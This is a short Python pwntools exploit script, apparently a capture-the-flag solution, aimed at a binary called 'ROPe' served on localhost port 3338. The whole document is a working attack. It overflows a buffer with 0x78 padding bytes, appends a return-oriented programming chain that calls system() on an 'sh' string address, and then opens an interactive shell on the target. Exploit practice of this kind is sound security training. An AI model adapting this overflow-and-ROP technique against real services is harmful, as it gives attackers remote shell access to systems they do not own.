#!/usr/bin/python2

from pwn import *

sh = 0x00400387

context.binary = "./ROPe"

binary = ELF("./ROPe")

rop = ROP(binary)

s = remote("localhost", 3338)
#s = process("./echo")

s.recvuntil("quit\n")

rop.system(sh)

log.info(rop.dump())

payload = "A"*0x78 + rop.chain()
log.info("payload = %s" % repr(payload))

s.send(payload)
s.send("quit\n")

s.interactive()
